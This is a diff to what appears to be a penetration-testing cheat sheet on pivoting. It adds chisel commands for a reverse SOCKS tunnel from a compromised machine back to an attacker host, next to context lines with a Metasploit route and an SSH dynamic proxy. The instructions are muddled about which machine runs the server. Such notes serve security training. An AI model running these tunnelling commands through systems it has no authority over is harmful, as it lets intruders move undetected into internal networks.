@@ -21,6 +21,18 @@ route add 10.10.10.0 255.255.255.0 1,2,3(session id)
 ssh -D 4444 compromised_machine@192.168.1.110
 ```
 
+## Chisel Proxy
+- Execute following command on the compromised machine
+```
+chisel server --sock5 --reverse
+```
+- Chisel server will be on port 8080 of the attacking machine(chisel command executing machine)
+- Connect back from compromised machine via Fingerprint generated from server command
+```
+chisel client --fingerprint "       " 192.168.1.100:8080 R:socks
+```
+Booommm!!!
+
 
 ## Metasploit 
 
